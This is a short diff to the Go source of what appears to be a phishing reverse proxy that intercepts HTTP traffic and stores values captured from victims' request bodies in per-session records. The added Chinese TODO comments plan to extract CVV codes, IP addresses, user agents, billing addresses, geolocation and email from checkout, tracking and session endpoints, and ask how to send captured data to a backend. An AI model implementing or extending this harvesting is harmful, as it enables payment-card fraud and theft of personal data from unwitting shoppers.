@@ -713,7 +713,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 								if cp.tp == "json" {
 									cm := cp.search.FindStringSubmatch(string(body))
 									if cm != nil && len(cm) > 1 {
-										// TODO 处理custom参数
+										// TODO 处理custom参数   怎么发送给后台？
 
 										p.setSessionCustom(ps.SessionId, cp.key_s, cm[1])
 										log.Success("[%d] Custom: [%s] = [%s]", ps.Index, cp.key_s, cm[1])
@@ -865,6 +865,11 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						req.Body = ioutil.NopCloser(bytes.NewBuffer([]byte(body)))
 					}
 				}
+
+				// TODO  从body获取指定接口指定数据， cvv,ip,useragent,billingAdress,经纬度,email
+				// /checkouts/unstable/graphql
+				// /v3/track
+				// /sessions
 
 				// check if request should be intercepted
 				if pl != nil {
